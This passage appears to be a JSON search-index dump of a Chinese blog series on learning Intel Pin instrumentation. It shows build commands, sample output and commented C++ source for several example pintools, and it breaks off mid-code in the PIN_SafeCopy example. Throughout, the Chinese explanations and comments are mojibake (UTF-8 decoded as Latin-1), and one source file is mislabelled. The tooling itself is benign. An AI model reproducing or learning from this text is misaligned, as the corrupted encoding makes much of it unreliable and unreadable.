ä¸»è¦æ˜¯é€šè¿‡è¿è¡Œä¸€äº› Pin å†…ç½®çš„æ ·ä¾‹ Pintoolï¼Œæ¥å®é™…æ„Ÿå—ä¸€ä¸‹ Pin çš„æ’æ¡©è¿‡ç¨‹ã€‚å®è·µå‡ºçœŸçŸ¥ã€‚ ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"1. Building the example tools ia32 æ¶æ„çš„æ ·ä¾‹ï¼š $ cd source/tools/ManualExamples $ make all TARGET=ia32 ia64 æ¶æ„çš„æ ·ä¾‹ï¼š $ cd source/tools/ManualExamples $ make all TARGET=intel64 ç¼–è¯‘å¹¶è¿è¡ŒæŸä¸ªæ ·ä¾‹ï¼š $ cd source/tools/ManualExamples $ make inscount0.test TARGET=intel64 ç¼–è¯‘æŸä¸ªæ ·ä¾‹ä½†ä¸è¿è¡Œï¼š $ cd source/tools/ManualExamples $ make obj-intel64/inscount0.so TARGET=intel64 # $ make obj-ia32/inscount0.so TARGET=ia32 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:1","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"2. Simple Instruction Count ï¼ˆæŒ‡ä»¤æ’æ¡©ï¼‰ åŠŸèƒ½ï¼šç»Ÿè®¡æ‰§è¡Œè¿‡çš„æŒ‡ä»¤çš„æ€»æ•°ã€‚ è¿è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ ../../../pin -t obj-intel64/inscount0.so -o inscount.out -- /bin/ls Makefile atrace.o imageload.out itrace proccount Makefile.example imageload inscount0 itrace.o proccount.o atrace imageload.o inscount0.o itrace.out $ cat inscount.out Count 422838 # è¾“å‡ºæ–‡ä»¶å­˜åœ¨é»˜è®¤åç§°ï¼Œå¯ä»¥ä½¿ç”¨-oå‚æ•°æŒ‡å®šè¾“å‡ºæ–‡ä»¶åã€‚ åŸç†ï¼šåœ¨æ¯ä¸ªæŒ‡ä»¤å‰æ’å…¥å¯¹ docount çš„è°ƒç”¨ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨ inscount.out æ–‡ä»¶ä¸­ã€‚ æºç  source/tools/ManualExamples/inscount0.cppï¼š #include \u003ciostream\u003e #include \u003cfstream\u003e #include \"pin.H\" using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // The running count of instructions is kept here // make it static to help the compiler optimize docount static UINT64 icount = 0; // è¿™é‡Œå°±æ˜¯æˆ‘ä»¬è°ƒç”¨çš„æ¡©ä»£ç  VOID docount() { icount++; } // Pin calls this function every time a new instruction is encountered // é‡åˆ°ä¸€æ¡æ–°æŒ‡ä»¤ï¼Œè°ƒç”¨ä¸€æ¬¡è¯¥å‡½æ•° VOID Instruction(INS ins, VOID* v) { // Insert a call to docount before every instruction, no arguments are passed // æŒ‡å®šè°ƒç”¨çš„æ¡©ä»£ç å‡½æ•°ï¼Œæ‰§è¡Œæ’å…¥æ“ä½œï¼Œæ²¡æœ‰å¯¹æ¡©ä»£ç å‡½æ•°è¿›è¡Œä¼ å‚ INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END); } // å¤„ç†è¾“å‡ºæ–‡ä»¶ï¼Œé»˜è®¤æ–‡ä»¶åä¸ºâ€œinscount.outâ€ KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // This function is called when the application exits VOID Fini(INT32 code, VOID* v) { // Write to a file since cout and cerr maybe closed by the application // å°†è¾“å‡ºä¿å­˜åˆ°æ–‡ä»¶ OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ /* argc, argv are the entire command line: pin -t \u003ctoolname\u003e -- ... */ /* ===================================================================== */ int main(int argc, char* argv[]) { // Initialize pin åˆå§‹åŒ– if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // Register Instruction to be called to instrument instructions // æ³¨å†Œæ’æ¡©å‡½æ•° INS_AddInstrumentFunction(Instruction, 0); // Register Fini to be called when the application exits // æ³¨å†Œç¨‹åºé€€å‡ºæ—¶çš„å¤„ç†å‡½æ•° PIN_AddFiniFunction(Fini, 0); // Start the program, never returns // å¼€å§‹æ‰§è¡Œ PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:2","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"3. Instruction Address Traceï¼ˆæŒ‡ä»¤æ’æ¡©ï¼‰ åŠŸèƒ½ï¼šæ‰“å°æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ è¿è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ ../../../pin -t obj-intel64/itrace.so -- /bin/ls Makefile atrace.o imageload.out itrace proccount Makefile.example imageload inscount0 itrace.o proccount.o atrace imageload.o inscount0.o itrace.out $ head itrace.out 0x40001e90 0x40001e91 0x40001ee4 0x40001ee5 0x40001ee7 0x40001ee8 0x40001ee9 0x40001eea 0x40001ef0 0x40001ee0 $ åŸç†ï¼šåœ¨è°ƒç”¨åˆ†æç¨‹åºæ—¶ï¼ŒPin å…è®¸ä¼ é€’æŒ‡ä»¤æŒ‡é’ˆã€å¯„å­˜å™¨å½“å‰å€¼ã€å†…å­˜æ“ä½œçš„æœ‰æ•ˆåœ°å€ã€å¸¸é‡ç­‰æ•°æ®ç»™åˆ†æç¨‹åºã€‚å®Œæ•´çš„å¯ä¼ é€’çš„å‚æ•°çš„ç±»å‹å¦‚ä¸‹ï¼šIARG_TYPEã€‚å°†æŒ‡ä»¤è®¡æ•°ç¨‹åºä¸­çš„å‚æ•°æ›´æ”¹ä¸º INS_InsertCall æ¥ä¼ é€’å³å°†æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ï¼Œå°† docount æ›´æ”¹ä¸º printip æ¥æ‰“å°æŒ‡ä»¤çš„åœ°å€ï¼Œæœ€åå°†è¾“å‡ºå†™å…¥åˆ°æ–‡ä»¶ itrace.out ä¸­ã€‚ æºç ``source/tools/ManualExamples/itrace.cpp`: #include \u003cstdio.h\u003e #include \"pin.H\" FILE* trace; // åœ¨æ¯æ¡æŒ‡ä»¤æ‰§è¡Œå‰éƒ½ä¼šè¢«è°ƒç”¨ï¼Œæ‰“å°å‡ºå½“å‰æŒ‡ä»¤çš„åœ°å€ VOID printip(VOID* ip) { fprintf(trace, \"%p\\n\", ip); } // é‡åˆ°ä¸€æ¡æ–°æŒ‡ä»¤è°ƒç”¨ä¸€æ¬¡ VOID Instruction(INS ins, VOID* v) { // åœ¨æ¯æ¡æŒ‡ä»¤å‰æ’å…¥å¯¹ printip å‡½æ•°çš„è°ƒç”¨ï¼Œå¹¶ä¼ é€’ ip å‚æ•° INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)printip, IARG_INST_PTR, IARG_END); } // ç»“æŸå‡½æ•° VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool prints the IPs of every instruction executed\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { trace = fopen(\"itrace.out\", \"w\"); // åˆå§‹åŒ– if (PIN_Init(argc, argv)) return Usage(); // æ¡©æŒ‡ä»¤æ³¨å†Œ INS_AddInstrumentFunction(Instruction, 0); // ç»“æŸé€»è¾‘æ³¨å†Œ PIN_AddFiniFunction(Fini, 0); // å¼€å§‹æ‰§è¡Œï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:3","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"4. Memory Reference Trace ï¼ˆæŒ‡ä»¤æ’æ¡©ï¼‰ åŠŸèƒ½ï¼šå†…å­˜å¼•ç”¨è¿½è¸ªï¼ˆåªå¯¹è¯»å†™å†…å­˜çš„æŒ‡ä»¤æ’æ¡©ï¼‰ è¿è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ ../../../pin -t obj-intel64/pinatrace.so -- /bin/ls Makefile atrace.o imageload.o inscount0.o itrace.out Makefile.example atrace.out imageload.out itrace proccount atrace imageload inscount0 itrace.o proccount.o $ head pinatrace.out 0x40001ee0: R 0xbfffe798 0x40001efd: W 0xbfffe7d4 0x40001f09: W 0xbfffe7d8 0x40001f20: W 0xbfffe864 0x40001f20: W 0xbfffe868 0x40001f20: W 0xbfffe86c 0x40001f20: W 0xbfffe870 0x40001f20: W 0xbfffe874 0x40001f20: W 0xbfffe878 0x40001f20: W 0xbfffe87c $ åŸç†ï¼šPin ä¸­åŒ…å«å¯ä»¥å¯¹æŒ‡ä»¤è¿›è¡Œåˆ†ç±»å’Œæ£€æŸ¥åŠŸèƒ½çš„ APIï¼Œé€šè¿‡è°ƒç”¨è¯¥ API å¯ä»¥å®ç°å¯¹æŸä¸€ç±»åŠŸèƒ½çš„å‡½æ•°çš„è¿½è¸ªã€‚ æºç source/tools/ManualExamples/itrace.cppï¼š /* * This file contains an ISA-portable PIN tool for tracing memory accesses. */ #include \u003cstdio.h\u003e #include \"pin.H\" FILE* trace; // æ‰“å°åœ°å€è¯»çš„æŒ‡ä»¤çš„åœ°å€ VOID RecordMemRead(VOID* ip, VOID* addr) { fprintf(trace, \"%p: R %p\\n\", ip, addr); } // æ‰“å°åœ°å€å†™çš„æŒ‡ä»¤çš„åœ°å€ VOID RecordMemWrite(VOID* ip, VOID* addr) { fprintf(trace, \"%p: W %p\\n\", ip, addr); } // ä½¿ç”¨è°“è¯å‡½æ•°è°ƒç”¨æ¥æ£€æµ‹å†…å­˜è®¿é—® // æ¯ä¸ªè¯»å’Œå†™çš„æŒ‡ä»¤éƒ½ä¼šè°ƒç”¨ VOID Instruction(INS ins, VOID* v) { // è·å–æŒ‡ä»¤ä¸­çš„å†…å­˜æ“ä½œæ•°è®¡æ•° UINT32 memOperands = INS_MemoryOperandCount(ins); // éå†æŒ‡ä»¤ä¸­çš„æ¯ä¸ªå†…å­˜æ“ä½œæ•° for (UINT32 memOp = 0; memOp \u003c memOperands; memOp++) { // å¦‚æœæ˜¯å†…å­˜è¯» if (INS_MemoryOperandIsRead(ins, memOp)) { INS_InsertPredicatedCall(ins, IPOINT_BEFORE, (AFUNPTR)RecordMemRead, IARG_INST_PTR, IARG_MEMORYOP_EA, memOp, IARG_END); } // åœ¨æŸäº›æ¶æ„ä¸‹ï¼Œå†…å­˜æ“ä½œæ•°å¯ä»¥åŒæ—¶ç”¨ä½œè¯»å’Œå†™ï¼Œä¾‹å¦‚ IA-32 çš„ %eaxï¼Œè¿™ç§æƒ…å†µä¸‹åªè®°å½•ä¸€æ¬¡ // å¦‚æœæ˜¯å†™ if (INS_MemoryOperandIsWritten(ins, memOp)) { INS_InsertPredicatedCall(ins, IPOINT_BEFORE, (AFUNPTR)RecordMemWrite, IARG_INST_PTR, IARG_MEMORYOP_EA, memOp, IARG_END); } } } VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool prints a trace of memory addresses\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { if (PIN_Init(argc, argv)) return Usage(); trace = fopen(\"pinatrace.out\", \"w\"); // æ³¨å†Œæ¡©å‡½æ•° INS_AddInstrumentFunction(Instruction, 0); // æ³¨å†Œç»“æŸå‡½æ•° PIN_AddFiniFunction(Fini, 0); // å¼€å§‹ï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:4","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"5. Detecting the loading and Unloading of Imagesï¼ˆimageæ’æ¡©ï¼‰ åŠŸèƒ½ï¼šåœ¨ image åŠ è½½å’Œå¸è½½æ—¶æ‰“å°ä¿¡æ¯åˆ° trace æ–‡ä»¶ä¸­ã€‚ æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡º: $ ../../../pin -t obj-intel64/imageload.so -- /bin/ls Makefile atrace.o imageload.o inscount0.o proccount Makefile.example atrace.out imageload.out itrace proccount.o atrace imageload inscount0 itrace.o trace.out $ cat imageload.out Loading /bin/ls Loading /lib/ld-linux.so.2 Loading /lib/libtermcap.so.2 Loading /lib/i686/libc.so.6 Unloading /bin/ls Unloading /lib/ld-linux.so.2 Unloading /lib/libtermcap.so.2 Unloading /lib/i686/libc.so.6 $ åŸç†ï¼šæœ¬è´¨ä¸Šæ²¡æœ‰å¯¹ image æ–‡ä»¶è¿›è¡Œæ’æ¡©ã€‚ æºç  source/tools/ManualExamples/imageload.cppï¼š // // This tool prints a trace of image load and unload events // #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e #include \u003cstdlib.h\u003e using std::endl; using std::ofstream; using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"imageload.out\", \"specify file name\"); ofstream TraceFile; // Pin åœ¨ image åŠ è½½æ—¶è°ƒç”¨è¯¥å‡½æ•°ï¼Œåœ¨è¯¥ä¾‹ä¸­æ²¡æœ‰è¿›è¡Œæ’æ¡© VOID ImageLoad(IMG img, VOID* v) { TraceFile \u003c\u003c \"Loading \" \u003c\u003c IMG_Name(img) \u003c\u003c \", Image id = \" \u003c\u003c IMG_Id(img) \u003c\u003c endl; } // Pin åœ¨ image å¸è½½æ—¶è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¯¹äºå°†è¦å¸è½½çš„imageæ— æ³•è¿›è¡Œæ’æ¡© VOID ImageUnload(IMG img, VOID* v) { TraceFile \u003c\u003c \"Unloading \" \u003c\u003c IMG_Name(img) \u003c\u003c endl; } // This function is called when the application exits // It closes the output file. VOID Fini(INT32 code, VOID* v) { if (TraceFile.is_open()) { TraceFile.close(); } } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This tool prints a log of image load and unload events\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // ç¬¦å·åˆå§‹åŒ– PIN_InitSymbols(); // pin åˆå§‹åŒ– if (PIN_Init(argc, argv)) return Usage(); TraceFile.open(KnobOutputFile.Value().c_str()); // æ³¨å†ŒåŠ è½½æ¡©å‡½æ•° IMG_AddInstrumentFunction(ImageLoad, 0); // æ³¨å†Œå¸è½½æ¡©å‡½æ•° IMG_AddUnloadFunction(ImageUnload, 0); // æ³¨å†Œé€€å‡ºå‡½æ•° PIN_AddFiniFunction(Fini, 0); // å¼€å§‹æ‰§è¡Œï¼Œæ— è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:5","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"6. More Efficient Instruction Counting ï¼ˆtrace æ’æ¡©ï¼‰ åŠŸèƒ½ï¼šè®¡ç®— BBL ï¼ˆå•å…¥å£å•å‡ºå£ï¼‰æ•°é‡ æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ ../../../pin -t obj-intel64/inscount1.so -o inscount.out -- /bin/ls Makefile atrace.o imageload.out itrace proccount Makefile.example imageload inscount0 itrace.o proccount.o atrace imageload.o inscount0.o itrace.out $ cat inscount.out Count 707208 åŸç†ï¼šåœ¨æ¯ä¸ª BBL è¿›è¡Œæ’æ¡©æ¥æ›¿ä»£åœ¨æ¯ä¸ªæŒ‡ä»¤è¿›è¡Œæ’æ¡©ï¼Œåœ¨è¿›è¡Œè®¡æ•°æ—¶ï¼Œä»¥ bbl ä¸ºå•ä½ï¼Œæ¯æ¬¡å¢åŠ æ¯ä¸ª bbl ä¸­çš„æŒ‡ä»¤æ•°é‡ã€‚ æºç  source/tools/ManualExamples/inscount1.cppï¼š #include \u003ciostream\u003e #include \u003cfstream\u003e #include \"pin.H\" using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // ä¿å­˜æŒ‡ä»¤çš„è¿è¡Œæ¬¡æ•°ï¼Œè®¾ç½®ä¸ºé™æ€å˜é‡ä»¥å¸®åŠ©ç¼–è¯‘å™¨ä¼˜åŒ– docount static UINT64 icount = 0; // åœ¨æ¯ä¸ª block å‰éƒ½ä¼šè¢«è°ƒç”¨ VOID docount(UINT32 c) { icount += c; } // Pin åœ¨é‡åˆ°ä¸€ä¸ªæ–°çš„block æ—¶è¿›è¡Œè°ƒç”¨ï¼Œæ’å…¥å¯¹ docount å‡½æ•°çš„è°ƒç”¨ VOID Trace(TRACE trace, VOID* v) { // è®¿é—® trace ä¸­çš„æ¯ä¸ª bbl for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // åœ¨æ¯ä¸ª bbl å‰æ’å…¥å¯¹ docount å‡½æ•°çš„è°ƒç”¨ï¼Œä¼ å…¥æŒ‡ä»¤æ•°é‡ BBL_InsertCall(bbl, IPOINT_BEFORE, (AFUNPTR)docount, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // é€€å‡ºå‡½æ•° VOID Fini(INT32 code, VOID* v) { // å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œç¨‹åºå¯èƒ½ä¼šå…³é—­ cout å’Œ cerr OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // åˆå§‹åŒ– pin if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // æ³¨å†Œæ’æ¡©å‡½æ•° TRACE_AddInstrumentFunction(Trace, 0); // æ³¨å†Œé€€å‡ºå‡½æ•° PIN_AddFiniFunction(Fini, 0); // å¼€å§‹æ‰§è¡Œï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:6","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"7. Procedure Instruction Countï¼ˆroutineæ’æ¡©ï¼‰ åŠŸèƒ½ï¼šè®¡ç®—ä¸€ä¸ª procedure è¢«è°ƒç”¨çš„æ¬¡æ•°ï¼Œä»¥åŠæ¯ä¸ª procedure ä¸­æ‰§è¡Œçš„å‘½ä»¤æ€»æ•°ã€‚ æ‰§è¡Œå’Œæ£€æŸ¥è¾“å‡ºï¼š $ ../../../pin -t obj-intel64/proccount.so -- /bin/grep proccount.cpp Makefile proccount_SOURCES = proccount.cpp $ head proccount.out Procedure Image Address Calls Instructions _fini libc.so.6 0x40144d00 1 21 __deregister_frame_info libc.so.6 0x40143f60 2 70 __register_frame_info libc.so.6 0x40143df0 2 62 fde_merge libc.so.6 0x40143870 0 8 __init_misc libc.so.6 0x40115824 1 85 __getclktck libc.so.6 0x401157f4 0 2 munmap libc.so.6 0x40112ca0 1 9 mmap libc.so.6 0x40112bb0 1 23 getpagesize libc.so.6 0x4010f934 2 26 $ æºç  source/tools/ManualExamples/proccount.cppï¼š // // This tool counts the number of times a routine is executed and // the number of instructions executed in a routine // #include \u003cfstream\u003e #include \u003ciomanip\u003e #include \u003ciostream\u003e #include \u003cstring.h\u003e #include \"pin.H\" using std::cerr; using std::dec; using std::endl; using std::hex; using std::ofstream; using std::setw; using std::string; ofstream outFile; // ä¿å­˜ procedure çš„æŒ‡ä»¤æ•° typedef struct RtnCount { string _name; string _image; ADDRINT _address; RTN _rtn; UINT64 _rtnCount; UINT64 _icount; struct RtnCount* _next; } RTN_COUNT; // æ¯ä¸ª procedure çš„æŒ‡ä»¤æ•°çš„é“¾è¡¨ RTN_COUNT* RtnList = 0; // æ¯æ¡æŒ‡ä»¤æ‰§è¡Œå‰è°ƒç”¨ VOID docount(UINT64* counter) { (*counter)++; } const char* StripPath(const char* path) { const char* file = strrchr(path, '/'); if (file) return file + 1; else return path; } // Pin åœ¨ä¸€ä¸ªæ–°çš„ rtn æ‰§è¡Œæ—¶è°ƒç”¨è¯¥å‡½æ•° VOID Routine(RTN rtn, VOID* v) { // å¯¹è¯¥routineè®¾ç½®ä¸€ä¸ªè®¡æ•°å™¨ RTN_COUNT* rc = new RTN_COUNT; // image unloaded æ—¶ï¼Œ RTN æ•°æ®æ¶ˆå¤±ï¼Œæ‰€ä»¥åœ¨æ­¤å¤„ç›´æ¥ä¿å­˜ï¼Œåç»­ fini ä¸­è¿˜è¦ä½¿ç”¨ rc-\u003e_name = RTN_Name(rtn); rc-\u003e_image = StripPath(IMG_Name(SEC_Img(RTN_Sec(rtn))).c_str()); rc-\u003e_address = RTN_Address(rtn); rc-\u003e_icount = 0; rc-\u003e_rtnCount = 0; // æ·»åŠ åˆ°routinesåˆ—è¡¨ rc-\u003e_next = RtnList; RtnList = rc; RTN_Open(rtn); // åœ¨routineå…¥å£å¤„æ’å…¥ä¸€ä¸ªcallï¼Œå¢åŠ callè®¡æ•° RTN_InsertCall(rtn, IPOINT_BEFORE, (AFUNPTR)docount, IARG_PTR, \u0026(rc-\u003e_rtnCount), IARG_END); // å¯¹äºroutineä¸­çš„æ¯æ¡æŒ‡ä»¤ for (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins)) { // æ’å…¥å¯¹docountå‡½æ•°çš„è°ƒç”¨ï¼Œå¢åŠ è¯¥rtnä¸­çš„æŒ‡ä»¤è®¡æ•° INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_PTR, \u0026(rc-\u003e_icount), IARG_END); } RTN_Close(rtn); } // é€€å‡ºå‡½æ•°ï¼Œæ‰“å°æ¯ä¸ªprocedureçš„åå­—å’Œè®¡æ•° VOID Fini(INT32 code, VOID* v) { outFile \u003c\u003c setw(23) \u003c\u003c \"Procedure\" \u003c\u003c \" \" \u003c\u003c setw(15) \u003c\u003c \"Image\" \u003c\u003c \" \" \u003c\u003c setw(18) \u003c\u003c \"Address\" \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c \"Calls\" \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c \"Instructions\" \u003c\u003c endl; for (RTN_COUNT* rc = RtnList; rc; rc = rc-\u003e_next) { if (rc-\u003e_icount \u003e 0) outFile \u003c\u003c setw(23) \u003c\u003c rc-\u003e_name \u003c\u003c \" \" \u003c\u003c setw(15) \u003c\u003c rc-\u003e_image \u003c\u003c \" \" \u003c\u003c setw(18) \u003c\u003c hex \u003c\u003c rc-\u003e_address \u003c\u003c dec \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c rc-\u003e_rtnCount \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c rc-\u003e_icount \u003c\u003c endl; } } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This Pintool counts the number of times a routine is executed\" \u003c\u003c endl; cerr \u003c\u003c \"and the number of instructions executed in a routine\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { PIN_InitSymbols(); outFile.open(\"proccount.out\"); if (PIN_Init(argc, argv)) return Usage(); // æ³¨å†Œæ¡©å‡½æ•° RTN_AddInstrumentFunction(Routine, 0); // æ³¨å†Œç¨‹åºé€€å‡ºæ—¶çš„ finiå‡½æ•° PIN_AddFiniFunction(Fini, 0); // å¼€å§‹æ‰§è¡Œï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } ä¸‹é¢æ˜¯ä¸€äº›Pinçš„åŠŸèƒ½æ€§ç‰¹å¾è¯´æ˜æ ·ä¾‹ã€‚ ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:7","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"8. Using PIN_SafeCopy() åŠŸèƒ½ï¼šä»æºå†…å­˜åŒºåŸŸå¤åˆ¶æŒ‡å®šæ•°é‡çš„å­—èŠ‚æ•°åˆ°ç›®çš„å†…å­˜åŒºåŸŸã€‚å³ä½¿æºæˆ–ç›®çš„åŒºåŸŸä¸å¯è®¿é—®ï¼Œæ­¤å‡½æ•°ä¹Ÿå¯ä¿è¯å®‰å…¨è¿”å›ç»™callerã€‚æ­¤å¤–ï¼Œè¯¥APIè¿˜å¯ä»¥è¯»å†™ç¨‹åºçš„å†…å­˜æ•°æ®ã€‚ æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ ../../../pin -t obj-ia32/safecopy.so -- /bin/cp makefile obj-ia32/safecopy.so.makefile.copy $ head safecopy.out Emulate loading from addr 0xbff0057c to ebx Emulate loading from addr 0x64ffd4 to eax Emulate loading from addr 0xbff00598 to esi Emulate loading from addr 0x6501c8 to edi Emulate loading from addr 0x64ff14 to edx Emulate loading from addr 0x64ff1c to edx Emulate loading from addr 0x64ff24 to edx Emulate loading from addr 0x64ff2c to edx Emulate loading from addr 0x64ff34 to edx Emulate loading from addr 0x64ff3c to edx æºç source/tools/ManualExamples/safecopy.cpp: #include \u003cstdio.h\u003e #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e using std::cerr; using std::endl; std::ofstream* out = 0; //======================================================= // Analysis routines //======================================================= // ä»å†…å­˜è½¬ç§»åˆ°å¯„å­˜å™¨ä¸­ ADDRINT DoLoad(REG reg, ADDRINT* addr) { *out \u003c\u003c \"Emulate loading from addr \" \u003c\u003c addr \u003c\u003c \" to \" \u003c\u003c REG_StringShort(reg) \u003c\u003c endl; ADDRINT value; PIN_SafeCopy(\u0026value, addr, sizeof(ADDRINT)); return value; } //======================================================= // Instrumentation routines //======================================================= VOID EmulateLoad(INS ins, VOID* v) { // Find the instructions that move a value from memory to a register if (INS_Opcode(ins) == XED_ICLASS_MOV \u0026\u0026 INS_IsMemoryRead(ins) \u0026\u0026 INS_OperandIsReg(ins, 0) \u0026\u0026 INS_OperandIsMemory(ins, 1)) { // op0 \u003c- *op1 